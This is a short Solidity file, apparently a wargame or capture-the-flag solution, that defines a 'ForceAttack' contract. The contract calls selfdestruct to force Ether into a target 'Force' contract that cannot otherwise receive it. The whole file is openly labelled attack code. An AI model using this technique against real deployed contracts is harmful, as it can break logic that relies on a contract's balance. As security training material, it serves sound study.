// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import './Force.sol';

contract ForceAttack {
  Force force;

  constructor(Force _force) {
    force = _force;
  }

  function attack() public payable {
    address payable sendTo = payable(address(force));
    selfdestruct(sendTo);
  }
}
